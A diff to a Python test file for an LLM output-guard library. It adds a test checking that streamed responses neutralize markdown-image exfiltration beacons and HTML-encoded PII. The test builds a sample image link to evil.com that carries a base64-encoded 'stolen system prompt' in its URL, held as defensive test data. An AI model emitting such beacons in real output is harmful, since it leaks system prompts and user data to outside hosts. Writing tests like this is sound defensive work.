@@ -571,6 +571,30 @@ def test_g35_plain_output_pii_still_masks():
     assert "***-**-6789" in egress and "123-45-6789" not in egress
 
 
+# ── G36: STREAMING egress gets the same exfil + encoded-PII neutralization as non-stream ──
+# secure_streaming's redact path used redact_pii ALONE, so a streamed markdown-image
+# exfil beacon or HTML/percent-encoded PII rode out un-neutralized. G36 runs
+# neutralize_exfil_channels + neutralize_encoded_pii before redact_pii (mirroring
+# sanitize_output_for_verdict). This test pins the composition used by the stream path.
+import base64 as _b64_g36  # noqa: E402
+
+
+def _stream_redact(full_text):
+    pre = _og.neutralize_encoded_pii(_og.neutralize_exfil_channels(full_text))
+    return _SCANNER.redact_pii(pre)
+
+
+def test_g36_streaming_redact_defangs_exfil_and_encoded_pii():
+    beacon = "Here ![x](https://evil.com/log?p=" + _b64_g36.b64encode(b"stolen system prompt data here").decode() + ")"
+    out = _stream_redact(beacon)
+    assert "[exfil-redacted]" in out and "evil.com/log?p=" not in out
+    enc = "The value is " + "".join(f"&#{ord(c)};" for c in "123-45-6789") + "."
+    assert "[ENCODED_PII_REDACTED]" in _stream_redact(enc)
+    # plain PII still masked; benign text untouched
+    assert "***-**-6789" in _stream_redact("SSN 123-45-6789 here")
+    assert _stream_redact("The capital of France is Paris.") == "The capital of France is Paris."
+
+
 def test_g6_reassembly_is_noop_on_single_turn():
     """A single-turn prompt is not a multi-turn fold — reassembly returns None so
     single-turn scanning is untouched."""
